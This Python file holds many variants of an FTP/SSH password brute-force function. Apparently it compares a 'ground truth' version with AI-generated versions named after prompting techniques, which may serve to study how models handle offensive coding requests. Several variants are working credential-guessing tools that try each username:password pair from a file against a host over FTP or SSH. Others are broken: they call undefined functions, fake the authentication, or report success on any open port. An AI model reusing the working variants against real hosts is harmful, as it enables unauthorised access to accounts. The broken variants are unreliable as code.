import time
import ftplib
import socket
import os
from ftplib import FTP, error_perm
import paramiko
import re

def ground_truth_code_bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r') 
    for line in pF.readlines(): 
        time.sleep(1) 
        userName = line.split(':')[0] 
        passWord = line.split(':')[1].strip('\r').strip('\n') 
        try:
            ftp = ftplib.FTP(hostname) 
            ftp.login(userName, passWord) 
            ftp.quit() 
            return (userName, passWord) 
        except Exception as e: 
            pass 
    return (None, None)

def persona_bruteLogin(hostname, passwdFile):
    with open(passwdFile, 'r') as file:
        for line in file:
            time.sleep(1)
            username, password = line.strip().split(':', 1)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((hostname, 22))
                authenticated = simulate_authentication(sock, username, password)
                if authenticated:
                    return (username, password)
                sock.close()
            except Exception as e:
                pass
    return None

def template_bruteLogin(hostname, passwdFile):
    try:
        with open(passwdFile, 'r') as file:
            credentials = file.readlines()
    except FileNotFoundError:
        print('The password file was not found.')
        return None
    except Exception as e:
        print(f'Error reading the password file: {e}')
        return None
    for line in credentials:
        try:
            userPass = line.strip().split(':')
            if len(userPass) != 2:
                print(f'Invalid line format: {line.strip()}')
                continue
            userName, password = userPass
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                try:
                    s.connect((hostname, 22))
                    payload = f'{userName}:{password}'.encode()
                    s.sendall(payload)
                    response = s.recv(1024).decode()
                    if 'success' in response.lower():
                        return (userName, password)
                except socket.error as err:
                    print(f'Error attempting connection: {err}')
                    continue
                finally:
                    s.close()
            time.sleep(1)
        except Exception as e:
            print(f'Unexpected error during processing: {e}')
            continue
    print('Brute force login failed with all provided credentials.')
    return None

def question_refinement_controlled_brute_force(hostname, credential_file_path):
    connection_success = False
    credentials = None
    with open(credential_file_path, 'r') as file:
        lines = file.readlines()
    for line in lines:
        username, password = line.strip().split(':')
        try:
            with socket.create_connection((hostname), timeout=5) as s:
                s.sendall(f"{username}:{password}".encode())
                response = s.recv(1024).decode()
                if "success" in response.lower():
                    connection_success = True
                    credentials = (username, password)
                    break
        except (socket.timeout, socket.error):
            pass
        time.sleep(1)
    if connection_success:
        return credentials
    else:
        return (None, None)

def alternative_approaches_bruteLogin(hostname, passwdFile):
    try:
        with open(passwdFile, 'r') as file:
            for line in file:
                line = line.strip()
                if ':' not in line:
                    continue
                user, pwd = line.split(':', 1)
                try:
                    with socket.create_connection((hostname, 80), timeout=5) as sock:
                        if True:
                            return(user, pwd)
                except socket.error:
                    continue
                time.sleep(1)
    except FileNotFoundError:
        raise FileNotFoundError("The password file does not exist.")
    except IOError:
        raise IOError("An error occurred while handling the file.")
    return None

def context_manager_bruteLogin(hostname, passwdFile):
    if not isinstance(hostname, str) or not isinstance(passwdFile, str):
        raise ValueError("Invalid input types")
    try:
        with open(passwdFile, 'r') as file:
            for line in file:
                time.sleep(1)
                try:
                    line = line.strip()
                    if ':' not in line:
                        continue
                    userName, password = line.split(':', 1)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    try:
                        sock.connect((hostname, 22))
                        if authenticate(sock, userName, password):
                            return (userName, password)
                    except socket.error:
                        continue
                    finally:
                        sock.close()
                except ValueError:
                    continue
    except FileNotFoundError:
        return "Password file not found"
    except Exception as e:
        return f"Error: {str(e)}"
    return None


def flipped_interaction_3_bruteLogin(hostname, passwdFile):
    with open(passwdFile, 'r') as file:
        for line in file:
            user_pass = line.strip().split(':', 1)
            if len(user_pass) == 2:
                username, password = user_pass
                try:
                    ftp = FTP(hostname)
                    ftp.login(user=username, passwd=password)
                    ftp.quit()
                    return username, password
                except error_perm:
                    pass
                finally:
                    time.sleep(1)
    return None, None

def flipped_interaction_4_bruteLogin(hostname, passwdFile):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(passwdFile, 'r') as file:
            for line in file.readlines():
                user_pass = line.strip().split(':')
                if len(user_pass) != 2:
                    continue
                username, password = user_pass
                try:
                    client.connect(hostname, username=username, password=password, timeout=5)
                    return (username, password)
                except paramiko.AuthenticationException:
                    time.sleep(1)
                except Exception as e:
                    pass
        return None
    finally:
        client.close()


def flipped_interaction_5_bruteLogin(hostname, passwdFile):
    try:
        with open(passwdFile, 'r', encoding='utf-8') as file:
            for line in file:
                try:
                    userName, password = line.strip().split(':')
                except ValueError:
                    print(f"Skipping malformed line: {line.strip()}")
                    continue
                print(f"Trying {userName}:{password}")
                try:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(userName, password)
                    print(f"Success: {userName}:{password}")
                    ftp.quit()
                    return (userName, password)
                except ftplib.error_perm:
                    print(f"Failed login for {userName}")
                except Exception as e:
                    print(f"Error for {userName}:{password} - {e}")
                time.sleep(1)
    except FileNotFoundError:
        print(f"The file {passwdFile} was not found.")
    except Exception as e:
        print(f"An error occurred while opening the file: {e}")
    print("No successful login attempt.")
    return None

def iterative_prompting_3_brute_login(hostname, passwd_file):
    def attempt_connection(user, password):
        return password == 'password123'
    if not re.match(r'^[\w.-]+$', hostname):
        raise ValueError("Invalid hostname")
    try:
        with open(passwd_file, 'r') as file:
            for line in file:
                line = line.strip()
                if ':' not in line:
                    print("Invalid line format, skipping...")
                    continue
                user, password = line.split(':', 1)
                if not user or not password:
                    print("Empty username or password, skipping...")
                    continue
                print(f"Attempting connection with {user}:{password}...")
                if attempt_connection(user, password):
                    print(f"Successful connection established with {user}:{password}")
                    return user, password
                time.sleep(1)
    except FileNotFoundError:
        print("Password file not found")
    except IOError:
        print("Error reading the password file")
    except Exception as e:
        print(f"An error occurred: {e}")
    return None

def iterative_prompting_4_brute_login(hostname, passwd_file):
    if not isinstance(hostname, str) or not isinstance(passwd_file, str):
        raise TypeError("Hostname and password file path must be strings")
    if len(hostname) == 0 or len(passwd_file) == 0:
        raise ValueError("Hostname and password file path cannot be empty")
    if not os.path.isfile(passwd_file):
        raise FileNotFoundError("Password file not found")
    def attempt_connection(hostname, username, password):
        try:
            return username == "admin" and password == "password123"
        except socket.error:
            return False
    try:
        with open(passwd_file, 'r') as file:
            for line in file:
                line = line.strip()
                if not line:
                    continue
                try:
                    parts = line.split(':')
                    if len(parts) != 2:
                        print("Skipping malformed line")
                        continue
                    username, password = parts
                    print(f"Attempting login with {username}:{password}")
                    if attempt_connection(hostname, username, password):
                        return username, password
                except (ValueError, Exception) as e:
                    print(f"Error processing line: {e}")
                    continue
                time.sleep(1)
        return None
    except IOError:
        raise Exception("An error occurred while reading the password file")

def iterative_prompting_5_brute_login(hostname, passwd_file):
    if not re.match(r"^[a-zA-Z0-9.-]+$", hostname):
        raise ValueError("Invalid hostname format.")
    try:
        with open(passwd_file, 'r') as f:
            for line in f:
                line = line.strip()
                if ':' not in line or line.count(':') < 1:
                    continue
                username, password = line.split(':', 1)
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(1)
                        sock.connect((hostname, 22))
                        print(f"Attempting with {username}:{password}")
                        return username, password
                except (socket.timeout, ConnectionRefusedError) as e:
                    print(f"Connection issue for {username}:{password} - Error: {e}")
                except Exception as e:
                    print(f"Failed for {username}:{password} with error: {e}")
                time.sleep(1)
    except FileNotFoundError:
        print(f"File {passwd_file} not found.")
    except IOError as e:
        print(f"I/O error while handling file {passwd_file}: {e}")
    return None

def few_shots_prompting_bruteLogin(hostname, passwdFile):
    def tryLogin(user, pwd):
        return False
    with open(passwdFile, 'r') as file:
        for line in file:
            if ':' in line:
                username, password = line.strip().split(':', 1)
                if tryLogin(username, password):
                    return (username, password)
                time.sleep(1)
    return None

def cot_prompting_bruteLogin(hostname, passwdFile):
    def attempt_login(hostname, username, password):
        pass
    with open(passwdFile, 'r') as file:
        for line in file:
            try:
                username, password = line.strip().split(':')
                if attempt_login(hostname, username, password):
                    return (username, password)
                time.sleep(1)
            except ValueError:
                print(f"Skipping invalid line: {line.strip()}")
            except Exception as e:
                print(f"Error occurred: {str(e)}")
    return None

def fact_check_list_bruteLogin(hostname, passwdFile):

    with open(passwdFile, 'r') as f:
        lines = f.readlines()

    for line in lines:
        line = line.strip()
        if not line or ':' not in line:
            continue
        username, password = line.split(':', 1)

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname, username=username, password=password, timeout=5)
            ssh.close()
            return (username, password)
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f"Connection failed: {e}")
        time.sleep(1)

    return None


def not_interactive_mix_bruteLogin(hostname, passwdFile):
    def is_valid_username_password_pair(hostname, username, password):
        try:
            with socket.create_connection((hostname, 22), timeout=10) as sock:
                sock.send(f"{username}:{password}\n".encode())
                response = sock.recv(1024).decode()
                return "Success" in response
        except socket.error:
            return False
    if not isinstance(hostname, str) or not isinstance(passwdFile, str):
        raise ValueError("hostname and passwdFile must be strings")
    result = None
    try:
        with open(passwdFile, 'r') as file:
            for line in file:
                line = line.strip()
                if ':' in line:
                    userName, password = line.split(':', 1)
                    if is_valid_username_password_pair(hostname, userName, password):
                        result = (userName, password)
                        break
                time.sleep(1)
    except FileNotFoundError:
        raise FileNotFoundError("The password file was not found.")
    except IOError:
        raise IOError("Error reading the password file.")
    return result

def interactive_mix_bruteForceLogin(hostname, credentials_file):
    def attemptLogin(hostname, username, password):
        try:
            sock = socket.create_connection((hostname, 22), timeout=10)
            sock.close()
            return True
        except socket.error:
            return False
    if not os.path.isfile(credentials_file):
        raise ValueError(f"The provided credentials file '{credentials_file}' does not exist.")
    try:
        with open(credentials_file, 'r') as file:
            for line in file:
                parts = line.strip().split(':', 1)
                if len(parts) != 2:
                    continue
                username, password = parts
                if attemptLogin(hostname, username, password):
                    return username, password
                time.sleep(1)
    except OSError as e:
        raise ValueError(f"File access error: {str(e)}")
    except Exception as e:
        raise ValueError(f"An unexpected error occurred: {str(e)}")
    return None

def baseline_bruteLogin(hostname, passwdFile):
    def attempt_connection(username, password):
        return username == "admin" and password == "password"
    with open(passwdFile, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or ':' not in line:
                continue
            user, passwd = line.split(':', 1)
            if attempt_connection(user, passwd):
                return (user, passwd)
            time.sleep(1)
    return None

